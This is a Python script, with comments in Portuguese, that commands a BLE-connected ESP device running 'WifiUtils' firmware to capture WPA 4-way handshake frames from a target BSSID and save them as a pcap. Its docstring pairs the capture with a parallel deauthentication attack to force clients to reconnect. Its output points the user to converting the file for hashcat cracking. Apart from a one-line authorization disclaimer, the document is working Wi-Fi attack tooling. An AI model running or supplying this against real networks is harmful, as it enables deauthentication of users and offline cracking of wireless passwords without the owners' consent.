#!/usr/bin/env python3
"""
WPA 4-way handshake capture via firmware WifiUtils.

Captura EAPOL frames num BSSID/canal específico e gera arquivo .pcap
(LINKTYPE_IEEE802_11 = 105) com os frames 802.11 brutos.

ATENÇÃO: ESP precisa estar **NÃO conectado** (chamado wifi_disconnect antes
se preciso). Use somente em redes próprias ou autorizadas.

Uso:
    ~/.platformio/penv/bin/python scripts/wpa_capture_test.py \\
        --bssid aa:bb:cc:dd:ee:ff --channel 6 \\
        [--duration 60] [--out handshake.pcap]

Pra forçar a re-handshake, dispare deauth em paralelo (outra shell):
    ~/.platformio/penv/bin/python scripts/deauth_test.py \\
        --bssid aa:bb:cc:dd:ee:ff --channel 6 --count 30
"""
import argparse
import asyncio
import json
import struct
import sys
import time

from bleak import BleakClient, BleakScanner

SVC_UUID    = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c01"
CMD_UUID    = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c02"
STREAM_UUID = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c03"

# pcap globals: magic + version + tz + sigfigs + snaplen + linktype
PCAP_MAGIC = 0xA1B2C3D4
LINKTYPE_IEEE802_11 = 105


def pcap_write_header(f):
    f.write(struct.pack("<IHHiIII",
                         PCAP_MAGIC, 2, 4, 0, 0, 65535,
                         LINKTYPE_IEEE802_11))


def pcap_write_record(f, frame: bytes, ts: float):
    sec = int(ts)
    usec = int((ts - sec) * 1e6)
    f.write(struct.pack("<IIII", sec, usec, len(frame), len(frame)))
    f.write(frame)


async def find_target():
    print("→ scanning for WifiUtils-* device...")
    async with BleakScanner(service_uuids=[SVC_UUID]) as sc:
        await asyncio.sleep(5)
        for d in sc.discovered_devices:
            if (d.name or "").startswith("WifiUtils-"):
                return d
    return None


def decode_eapol(payload: bytes) -> dict:
    if len(payload) < 16:
        return {"_truncated": payload.hex()}
    bssid = ":".join(f"{b:02x}" for b in payload[0:6])
    sta = ":".join(f"{b:02x}" for b in payload[6:12])
    msg_idx = payload[12]
    flags = payload[13]
    orig_len = int.from_bytes(payload[14:16], "big")
    frame = bytes(payload[16:])
    return {"bssid": bssid, "sta": sta, "msg": msg_idx, "flags": flags,
            "orig_len": orig_len, "frame": frame}


def decode_done(payload: bytes) -> dict:
    if len(payload) < 13:
        return {"_truncated": payload.hex()}
    bssid = ":".join(f"{b:02x}" for b in payload[0:6])
    return {
        "bssid":         bssid,
        "frames_count":  payload[6],
        "msg_mask":      payload[7],
        "elapsed_ms":    int.from_bytes(payload[8:12], "big"),
        "status":        payload[12],
    }


async def run(args):
    dev = await find_target()
    if not dev:
        print("✗ WifiUtils device not found"); sys.exit(2)
    print(f"→ connecting to {dev.address} ({dev.name})")

    pcap_file = open(args.out, "wb")
    pcap_write_header(pcap_file)

    async with BleakClient(dev) as client:
        done_evt = asyncio.Event()
        summary = {}
        captured = 0

        def cmd_cb(_h, data):
            print(f"← cmd: {data.decode('utf-8', errors='replace')}")

        def stream_cb(_h, data):
            nonlocal captured
            if len(data) < 4:
                return
            mtype = data[2]
            payload = bytes(data[4:])
            if mtype == 0x18:
                e = decode_eapol(payload)
                msg_label = f"M{e['msg']}" if e['msg'] else "M?"
                trunc = " (TRUNC)" if (e['flags'] & 0x01) else ""
                print(f"  EAPOL {msg_label}  bssid={e['bssid']}  sta={e['sta']}"
                      f"  len={e['orig_len']}{trunc}")
                pcap_write_record(pcap_file, e['frame'], time.time())
                captured += 1
            elif mtype == 0x19:
                summary.update(decode_done(payload))
                done_evt.set()
            else:
                print(f"  ?  type=0x{mtype:02x} ({len(payload)}B)")

        await client.start_notify(CMD_UUID, cmd_cb)
        await client.start_notify(STREAM_UUID, stream_cb)

        cmd = {
            "cmd": "wpa_capture", "seq": 1,
            "bssid": args.bssid,
            "channel": args.channel,
            "duration_sec": args.duration,
        }
        payload = json.dumps(cmd)
        print(f"→ {payload}")
        await client.write_gatt_char(CMD_UUID, payload.encode("utf-8"), response=True)

        try:
            await asyncio.wait_for(done_evt.wait(), timeout=args.duration + 15)
        except asyncio.TimeoutError:
            print("✗ timeout waiting WPA_CAPTURE_DONE")

        pcap_file.close()

        if summary:
            mask = summary['msg_mask']
            seen = ",".join([f"M{i+1}" for i in range(4) if mask & (1 << i)]) or "-"
            print(f"\nWPA_CAPTURE_DONE: {summary['frames_count']} frames "
                  f"em {summary['elapsed_ms']}ms (mask=0x{mask:02x} → {seen}, "
                  f"status={summary['status']})")
            if mask == 0x0F:
                print(f"✓ 4-way handshake completo capturado")
            else:
                print(f"⚠ handshake parcial — pode não ser hashcat-friendly")

        print(f"\n→ pcap salvo em: {args.out} ({captured} frames)")
        print(f"→ converter pra hccapx: hcxpcapngtool {args.out} -o handshake.hccapx")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="WPA 4-way handshake capture via firmware WifiUtils.",
    )
    parser.add_argument("--bssid", required=True, help="BSSID alvo (aa:bb:cc:dd:ee:ff)")
    parser.add_argument("--channel", type=int, required=True, help="Canal do AP (1–13)")
    parser.add_argument("--duration", type=int, default=60,
                        help="Duração max em segundos (default 60, max 600)")
    parser.add_argument("--out", default="handshake.pcap",
                        help="Arquivo pcap de saída (default handshake.pcap)")
    args = parser.parse_args()

    asyncio.run(run(args))
